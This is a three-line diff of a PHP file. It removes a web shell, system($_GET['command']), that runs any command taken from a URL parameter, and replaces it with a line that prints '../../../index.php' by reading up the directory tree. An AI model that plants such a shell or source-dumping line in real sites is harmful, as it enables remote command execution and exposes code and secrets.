@@ -1,3 +1,3 @@
 <?php
-    system($_GET['command']);
+    echo file_get_contents("../../../index.php");
 ?>
